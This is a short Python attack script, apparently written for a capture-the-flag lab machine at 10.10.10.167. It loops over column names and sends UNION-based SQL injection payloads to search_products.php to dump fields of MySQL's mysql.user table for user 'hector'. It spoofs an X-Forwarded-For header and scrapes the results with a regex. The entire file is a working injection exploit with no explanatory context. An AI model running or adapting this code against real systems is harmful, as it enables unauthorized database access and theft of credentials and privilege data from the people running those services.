#!/usr/bin/env python3

from urllib import request
import re

url = "http://10.10.10.167/search_products.php"
headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "X-Forwarded-For":"192.168.4.28", "Content-Type":"application/x-www-form-urlencoded"}

with open("user.table") as f:
    for l in f:
        priv = l.strip('\n')
        post = f"productName=asd' UNION SELECT 1,2,3,4,'XXX',group_concat({priv},'\n\r') from mysql.user where User='hector'-- -".encode()
        req = request.Request(url, headers=headers, data=post)
        resp = request.urlopen(req).read().decode()
        regex = re.findall('XXX.*', resp)
        val = re.sub('XXX</td><td>', '' ,''.join(regex))
        print(f"{priv} : {val}")


